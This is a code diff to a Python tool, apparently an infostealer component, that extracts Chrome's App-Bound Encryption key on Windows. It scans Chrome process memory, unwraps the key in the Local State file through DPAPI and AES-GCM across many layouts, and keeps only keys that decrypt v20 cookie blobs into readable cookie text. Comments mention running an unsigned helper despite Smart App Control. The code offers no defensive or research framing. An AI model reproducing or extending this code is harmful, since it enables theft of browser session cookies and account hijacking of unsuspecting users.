@@ -80,6 +80,7 @@ _cache: dict[str, Any] = {
     "v20_ok": 0,
     "_v20_verify": [],
     "_app_bound_blob": None,
+    "_app_bound_b64": "",
 }
 
 # In-process memo of Local State unwrap. Key bytes stay in RAM only.
@@ -169,6 +170,7 @@ def _discover_uncached() -> tuple[str, str, str]:
     _cache["v20_ok"] = 0
     _cache["_v20_verify"] = []
     _cache["_app_bound_blob"] = None
+    _cache["_app_bound_b64"] = ""
     pairs_all: list[tuple[str, str]] = []
     decrypt_failures = 0
     found_hosts = 0
@@ -2556,6 +2558,7 @@ def _unwrap_app_bound_key(
     """chrome_dir memscan unwrap. Never CoCreate IElevator / ElevationService."""
     raw = _app_bound_ciphertext(b64_key)
     _cache["_app_bound_blob"] = raw
+    _cache["_app_bound_b64"] = b64_key
     sample = _resolve_v20_sample(v20_sample)
     if not raw and not sample:
         return None, "chrome_dir", "no_app_bound_key"
@@ -2563,9 +2566,12 @@ def _unwrap_app_bound_key(
         key, hr = _elevator_decrypt_via_chrome_dir(sample or b"")
     except Exception as exc:  # noqa: BLE001 — ctypes pointer-width bugs
         key, hr = None, type(exc).__name__
-    if key:
-        return key, "chrome_dir", hr or "0x00000000"
+    # 0x00000000 only when the key decrypts a landed v20 blob to cookie text.
+    if _abe_proves_cookies(key, sample):
+        return key, "chrome_dir", "0x00000000"
     # Do not fall through to CoCreate. Helper-miss must not become CLASSNOTREG.
+    if (hr or "").strip() in {"", "0x00000000", "ok"}:
+        hr = "abe:no_cookie" if key else (hr or "helper:never_ran")
     return None, "chrome_dir", hr or "helper:never_ran"
 
 
@@ -3127,8 +3133,103 @@ def _aes_key_windows(material: bytes | None) -> list[bytes]:
     return out
 
 
+def _app_bound_blob_bytes() -> bytes:
+    """APPB-stripped Local State body. Re-read disk if memscan cache was cleared."""
+    blob = _cache.get("_app_bound_blob")
+    if isinstance(blob, (bytes, bytearray)) and blob:
+        return bytes(blob)
+    b64 = _cache.get("_app_bound_b64")
+    if isinstance(b64, str) and b64.strip():
+        raw = _app_bound_ciphertext(b64)
+        if raw:
+            _cache["_app_bound_blob"] = raw
+            return raw
+    return b""
+
+
+def _plain_aes_keys(plain: bytes | None) -> list[bytes]:
+    """Every 32-byte window of an APPB GCM plaintext. Do not use on raw APC cands."""
+    if not plain:
+        return []
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(buf: bytes | None) -> None:
+        if buf and len(buf) == 32 and buf not in seen:
+            seen.add(buf)
+            out.append(buf)
+
+    add(_accept_aes_key(plain))
+    if len(plain) == 32:
+        add(plain)
+        return out
+    for off in range(0, len(plain) - 31):
+        add(plain[off : off + 32])
+    add(_accept_aes_key(plain[32:] if len(plain) > 32 else b""))
+    return out
+
+
+def _pop_len_prefixed(blob: bytes) -> tuple[bytes, bytes] | None:
+    """elevator.cc AppendStringWithLength: uint32 LE + payload."""
+    if len(blob) < 4:
+        return None
+    n = int.from_bytes(blob[:4], "little")
+    if n < 0 or 4 + n > len(blob):
+        return None
+    return blob[4 : 4 + n], blob[4 + n :]
+
+
+def _app_bound_bodies(blob: bytes) -> list[bytes]:
+    """APPB / DPAPI / length-prefixed views of Local State. No cookie bytes."""
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(part: bytes | None) -> None:
+        if not part:
+            return
+        raw = bytes(part)
+        if raw not in seen:
+            seen.add(raw)
+            out.append(raw)
+
+    add(blob)
+    inner = _dpapi_unprotect(blob)
+    if inner:
+        add(inner)
+    for body in list(out):
+        if body.startswith(b"APPB"):
+            add(body[4:])
+        if body.startswith(b"v20"):
+            add(body[3:])
+        if body.startswith(b"v10"):
+            add(body[3:])
+        if body.startswith(b"DPAPI"):
+            add(body[5:])
+            dp = _dpapi_unprotect(body[5:])
+            if dp:
+                add(dp)
+        popped = _pop_len_prefixed(body)
+        if popped:
+            _head, rest = popped
+            add(_head)
+            add(rest)
+            popped2 = _pop_len_prefixed(rest)
+            if popped2:
+                add(popped2[0])
+                add(popped2[1])
+        idx = body.lower().find(b"chrome.exe")
+        if idx != -1:
+            rest = body[idx + 10 :]
+            if rest.startswith(b"\x00"):
+                rest = rest[1:]
+            add(rest)
+            if rest:
+                add(rest[1:])
+    return out
+
+
 def _app_bound_gcm_payloads(blob: bytes) -> list[bytes]:
-    """Local State APPB body as GCM payloads: 12-byte nonce at the header."""
+    """GCM views: 12-byte nonce at the record header, including embedded 60-byte."""
     out: list[bytes] = []
     seen: set[bytes] = set()
 
@@ -3140,27 +3241,48 @@ def _app_bound_gcm_payloads(blob: bytes) -> list[bytes]:
             seen.add(raw)
             out.append(raw)
 
-    add(blob)
-    if blob.startswith(b"APPB"):
-        add(blob[4:])
-    if blob.startswith(b"v20"):
-        add(blob[3:])
-    if blob.startswith(b"DPAPI"):
-        add(blob[5:])
-    if len(blob) >= 8:
-        n = int.from_bytes(blob[:4], "little")
-        if 29 <= n <= len(blob) - 4:
-            add(blob[4 : 4 + n])
-    add(blob[4:])
-    add(blob[8:])
-    inner = _dpapi_unprotect(blob)
-    if inner:
-        add(inner)
-        if inner.startswith(b"APPB"):
-            add(inner[4:])
-        if inner.startswith(b"v20"):
-            add(inner[3:])
+    for body in _app_bound_bodies(blob):
+        add(body)
+        add(body[4:])
+        add(body[8:])
+        if body and body[0] in (0, 1, 2, 3):
+            add(body[1:])
+        # Chrome 137+ flag=3: flag | enc_key(32) | iv | ct | tag
+        if len(body) >= 1 + 32 + 12 + 16 + 1 and body[0] == 3:
+            add(body[33:])
+        # 4-byte header steps. Byte-spray here would burn the 6s memscan budget.
+        limit = min(48, max(0, len(body) - 29))
+        for off in range(0, limit + 1, 4):
+            add(body[off:])
+            if off + 60 <= len(body):
+                add(body[off : off + 60])
+            if body[off : off + 1] in (b"\x00", b"\x01", b"\x02", b"\x03") and off + 61 <= len(body):
+                add(body[off + 1 : off + 61])
+        for n in (60, 61, 64, 76, 80):
+            if len(body) >= n:
+                add(body[-n:])
+                add(body[-n + 1 :])
     return out
+
+
+def _aes_gcm_decrypt_layouts(payload: bytes, key: bytes) -> bytes:
+    """nonce|ct|tag (cookies) and nonce|tag|ct (elevation flag 1/2)."""
+    if not payload or not key or len(payload) < 12 + 16 + 1:
+        return b""
+    plain = _aes_gcm_decrypt_bytes(payload, key)
+    if plain:
+        return plain
+    if payload[:3] == b"v20":
+        plain = _aes_gcm_decrypt_bytes(payload[3:], key)
+        if plain:
+            return plain
+        payload = payload[3:]
+        if len(payload) < 12 + 16 + 1:
+            return b""
+    nonce, tag, ciphertext = payload[:12], payload[12:28], payload[28:]
+    if ciphertext:
+        return _aes_gcm_decrypt_bytes(nonce + ciphertext + tag, key)
+    return b""
 
 
 def _cookie_keys_from_wrap(wrap: bytes, app_bound: bytes | None) -> list[bytes]:
@@ -3173,22 +3295,23 @@ def _cookie_keys_from_wrap(wrap: bytes, app_bound: bytes | None) -> list[bytes]:
             seen.add(key)
             keys.append(key)
 
-    if not wrap or len(wrap) != 32 or not app_bound:
+    if not wrap or len(wrap) != 32:
         return keys
-    for payload in _app_bound_gcm_payloads(app_bound):
-        plain = _aes_gcm_decrypt_bytes(payload, wrap)
-        if not plain and payload[:3] == b"v20":
-            plain = _aes_gcm_decrypt_bytes(payload[3:], wrap)
+    blob = app_bound if isinstance(app_bound, (bytes, bytearray)) and app_bound else _app_bound_blob_bytes()
+    if not blob:
+        return keys
+    for payload in _app_bound_gcm_payloads(bytes(blob)):
+        plain = _aes_gcm_decrypt_layouts(payload, wrap)
         if not plain:
             continue
-        add(_accept_aes_key(plain))
-        for window in _aes_key_windows(plain):
+        for window in _plain_aes_keys(plain):
             add(window)
-        if len(plain) > 32:
-            add(_accept_aes_key(plain[32:]))
-            for window in _aes_key_windows(plain[32:]):
-                add(window)
     return keys
+
+
+def _abe_proves_cookies(key: bytes | None, v20_sample: bytes | None) -> bool:
+    """True only when a 32-byte key yields cookie text from a landed v20 blob."""
+    return bool(key) and len(key) == 32 and _v20_key_ok(key, v20_sample, all_blobs=True)
 
 
 def _abe_key_from_material(
@@ -3197,15 +3320,17 @@ def _abe_key_from_material(
     """Direct cookie key, or Chrome 151 wrap: APC key GCM-unwraps the APPB blob."""
     if not material:
         return None
-    app_bound = _cache.get("_app_bound_blob")
-    if not isinstance(app_bound, (bytes, bytearray)):
-        app_bound = None
+    app_bound = _app_bound_blob_bytes() or None
     for cand in _aes_key_windows(material):
         if _v20_key_ok(cand, v20_sample, all_blobs=True):
             return cand
         for derived in _cookie_keys_from_wrap(cand, app_bound):
             if _v20_key_ok(derived, v20_sample, all_blobs=True):
                 return derived
+            # One more wrap level: inner 32 may be another GCM wrap key.
+            for nested in _cookie_keys_from_wrap(derived, app_bound):
+                if _v20_key_ok(nested, v20_sample, all_blobs=True):
+                    return nested
     return None
 
 
@@ -3221,7 +3346,8 @@ def _v20_key_ok(
         samples = [samples[0], samples[len(samples) // 2], samples[-1]]
     for cand in _aes_key_windows(key):
         for sample in samples:
-            if _aes_gcm_decrypt_bytes(sample[3:], cand):
+            plain = _aes_gcm_decrypt_bytes(sample[3:], cand)
+            if plain and _v20_cookie_text(plain):
                 return True
     return False
 
@@ -3266,7 +3392,7 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
             return None, _join_abe_hr(trail)
     # In-process memscan first. Unsigned helper is blocked by Smart App Control (4551).
     key, hr = _memscan_abe_key(v20_sample)
-    if key:
+    if _abe_proves_cookies(key, v20_sample):
         return key, "0x00000000"
     if hr:
         trail.append(hr)
@@ -3281,7 +3407,7 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         for dest in dests or [helper]:
             ran = True
             key, hr = _run_abe_helper(dest, v20_sample)
-            if key:
+            if _abe_proves_cookies(key, v20_sample):
                 return key, "0x00000000"
             if hr:
                 trail.append(hr)
